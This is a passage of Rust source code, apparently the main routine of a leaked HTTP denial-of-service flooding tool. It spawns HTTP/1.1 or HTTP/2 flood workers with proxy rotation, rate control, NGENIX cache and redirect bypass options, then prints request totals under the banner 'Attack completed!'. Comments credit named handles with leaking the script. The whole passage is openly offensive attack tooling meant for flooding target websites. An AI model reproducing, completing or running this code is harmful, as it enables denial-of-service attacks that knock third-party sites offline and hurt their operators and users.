        "NGENIX".green(), if args.ngenix { "on" } else { "off" },
        "Auth".green(), if args.auth { "on" } else { "off" }
    );
    println!(
        "{} {}",
        "Proxy".green(),
        if proxy_rotator.is_empty() { "none".to_string() } else { format!("{}", proxy_rotator.proxies.len()) }
    );
    println!(
        "{} {}",
        "Bypass redirect:".green(),
        if args.bypass_redirect {
            format!("enabled (max {} hops)", args.max_redirects)
        } else {
            "disabled".to_string()
        }
    );
    if !proxy_rotator.is_empty() {
        println!("{} {} proxies loaded", "Proxy:".green(), proxy_rotator.proxies.len());
    }
    println!("{}", "=".repeat(60).cyan());

    let end_time = if args.duration > 0 {
        Some(Instant::now() + Duration::from_secs(args.duration))
    } else {
        None
    };

    // Spawn worker threads
    let mut handles = vec![];
    let rate_control = Arc::new(RateControl::new(args.rate_control));
    let ngenix_cache = Arc::new(NgenixCache::new());

    // Choose between HTTP/1 and HTTP/2 flooding
    let use_http1 = args.http1;
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    for i in 0..args.workers {
        let args_arc = Arc::clone(&args);
        let stats_arc = Arc::clone(&stats);
        let proxy_rotator_arc = Arc::clone(&proxy_rotator);
        let rc_arc = Arc::clone(&rate_control);
        let ng_arc = Arc::clone(&ngenix_cache);
        
        let handle = tokio::spawn(async move {
            let result = if use_http1 {
                // Use HTTP/1.1 flood worker
                http1_flood_worker(args_arc, stats_arc, i, end_time, proxy_rotator_arc, rc_arc, ng_arc).await
            } else {
                // Use HTTP/2 flood worker (default)
                flood_worker(args_arc, stats_arc, i, end_time, proxy_rotator_arc, rc_arc, ng_arc).await
            };
            
            if let Err(_e) = result {
                // Silent error - worker failed
            }
        });
        handles.push(handle);
    }

    // Spawn stats reporter
    let stats_arc = Arc::clone(&stats);
    let proxy_rot_stats = Arc::clone(&proxy_rotator);
    let stats_handle = tokio::spawn(async move {
        stats_reporter(stats_arc, args.duration, args.debug, proxy_rot_stats).await;
    });

    // Wait for all workers
    for handle in handles {
        let _ = handle.await;
    }

    stats_handle.abort();

    println!("\n{}", "=".repeat(60).cyan());
    println!("{}", "Attack completed!".green().bold());
    println!(
        "{} {}",
        "Total Requests:".green(),
        stats.requests.load(Ordering::Relaxed)
    );
    println!(
        "{} {}",
        "Total Errors:".red(),
        stats.errors.load(Ordering::Relaxed)
    );
    println!("{}", "=".repeat(60).cyan());

    Ok(())
}


//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD